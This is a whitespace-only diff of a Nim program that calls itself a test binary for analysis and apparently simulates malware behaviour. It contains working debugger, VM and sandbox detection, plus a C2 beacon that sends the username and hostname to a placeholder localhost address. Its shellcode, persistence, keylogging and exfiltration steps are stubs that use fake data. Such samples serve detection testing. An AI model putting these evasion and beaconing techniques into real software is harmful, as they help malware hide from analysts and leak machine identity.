@@ -58,7 +58,7 @@ proc checkAnalysisTools(): bool =
     obfuscate("x64dbg"),
     obfuscate("procmon")
   ]
-  
+
   for tool in tools:
     for pid in walkDir("/proc"):
       if pid.kind == pcDir:
@@ -81,14 +81,14 @@ proc detectVM(): bool =
     for indicator in vmIndicators:
       if indicator in cpuinfo:
         return true
-  
+
   # Check DMI info
   let dmiPaths = @[
     "/sys/devices/virtual/dmi/id/product_name",
     "/sys/devices/virtual/dmi/id/sys_vendor",
     "/sys/devices/virtual/dmi/id/board_vendor"
   ]
-  
+
   for path in dmiPaths:
     if fileExists(path):
       try:
@@ -97,7 +97,7 @@ proc detectVM(): bool =
           return true
       except:
         discard
-  
+
   return false
 
 # Process hollowing simulation
@@ -120,18 +120,18 @@ proc beaconC2(): bool =
   try:
     let socket = newSocket()
     defer: socket.close()
-    
+
     # DNS resolution would happen here
     let serverAddr = "127.0.0.1"  # Placeholder
-    
+
     socket.connect(serverAddr, C2Port)
-    
-    var beacon = obfuscate("BEACON|") & getEnv("USER") & "|" & 
+
+    var beacon = obfuscate("BEACON|") & getEnv("USER") & "|" &
                  getHostname() & "|" & $epochTime()
-    
+
     var data = cast[seq[byte]](beacon)
     xorCrypt(data)
-    
+
     socket.send(cast[string](data))
     return true
   except:
@@ -140,10 +140,10 @@ proc beaconC2(): bool =
 # Code injection using Nim's FFI
 proc injectShellcode() =
   echo obfuscate("Injecting shellcode...")
-  
+
   # NOP sled for demonstration
   var shellcode = @[0x90'u8, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90]
-  
+
   # In real malware would:
   # 1. Allocate executable memory
   # 2. Copy shellcode
@@ -153,7 +153,7 @@ proc injectShellcode() =
 proc installPersistence() =
   let exePath = getAppFilename()
   let cronJob = "* * * * * " & exePath & " --silent\n"
-  
+
   try:
     # Would write to /etc/cron.d/ or user crontab
     echo obfuscate("Installing persistence: ") & cronJob
@@ -170,17 +170,17 @@ proc cpuBurn() {.thread.} =
 proc resourceExhaustion() =
   echo obfuscate("Starting resource exhaustion...")
   var threads: array[4, Thread[void]]
-  
+
   for i in 0..<threads.len:
     createThread(threads[i], cpuBurn)
-  
+
   joinThreads(threads)
 
 # Polymorphic code generation
 proc generatePolymorphicCode(): seq[byte] =
   randomize()
   var code: seq[byte] = @[]
-  
+
   # Generate random NOP-equivalent instructions
   for i in 0..31:
     case rand(3)
@@ -188,7 +188,7 @@ proc generatePolymorphicCode(): seq[byte] =
     of 1: code.add(@[0x66'u8, 0x90])  # 66 NOP
     of 2: code.add(@[0x0F'u8, 0x1F, 0x00])  # Multi-byte NOP
     else: code.add(0x90'u8)
-  
+
   return code
 
 # Registry/Config manipulation
@@ -197,7 +197,7 @@ proc createRegistry() =
   config[obfuscate("install_date")] = $epochTime()
   config[obfuscate("victim_id")] = getMD5(getEnv("USER") & getHostname())
   config[obfuscate("version")] = "1.0"
-  
+
   # Would persist to file or registry
   echo obfuscate("Registry created: ") & $config
 
@@ -209,7 +209,7 @@ proc keylogger() =
     obfuscate("password: P@ssw0rd123"),
     obfuscate("credit_card: 4111111111111111")
   ]
-  
+
   try:
     var f = open(logPath, fmAppend)
     for key in keys:
@@ -221,19 +221,19 @@ proc keylogger() =
 # Data exfiltration
 proc exfiltrateData() =
   var sensitiveData: seq[string] = @[]
-  
+
   # Collect system info
   sensitiveData.add(obfuscate("OS: ") & getEnv("OS"))
   sensitiveData.add(obfuscate("User: ") & getEnv("USER"))
   sensitiveData.add(obfuscate("Home: ") & getEnv("HOME"))
-  
+
   # Collect fake sensitive data
   sensitiveData.add(obfuscate("SSN: 123-45-6789"))
   sensitiveData.add(obfuscate("API_KEY: sk_test_1234567890"))
-  
+
   let dataHash = getMD5(sensitiveData.join("\n"))
   echo obfuscate("Data collected. Hash: ") & dataHash
-  
+
   # Send to C2
   discard beaconC2()
 
@@ -241,11 +241,11 @@ proc exfiltrateData() =
 proc selfModify() =
   let exePath = getAppFilename()
   var signature = newSeq[byte](16)
-  
+
   randomize()
   for i in 0..<signature.len:
     signature[i] = rand(255).byte
-  
+
   echo obfuscate("Self-modification signature: ") & signature.mapIt(it.int.toHex(2)).join()
 
 # Anti-VM sleep acceleration detection
@@ -258,21 +258,21 @@ proc detectSleepAcceleration(): bool =
 # Main execution
 when isMainModule:
   echo obfuscate("Nim Test Binary for Analysis")
-  
+
   # Initialize anti-analysis
   antiAnalysis.debuggerDetected = checkDebugger() or timingCheck()
   antiAnalysis.vmDetected = detectVM() or detectSleepAcceleration()
   antiAnalysis.sandboxDetected = checkAnalysisTools()
-  
+
   if antiAnalysis.debuggerDetected:
     echo obfuscate("Debugger detected!")
-  
+
   if antiAnalysis.vmDetected:
     echo obfuscate("Virtual machine detected!")
-    
+
   if antiAnalysis.sandboxDetected:
     echo obfuscate("Sandbox detected!")
-  
+
   # Command line parsing
   if paramCount() > 0:
     case paramStr(1)
@@ -307,5 +307,5 @@ when isMainModule:
     exfiltrateData()
     let polyCode = generatePolymorphicCode()
     echo obfuscate("Polymorphic code size: ") & $polyCode.len
-    
+
   echo obfuscate("Program completed")
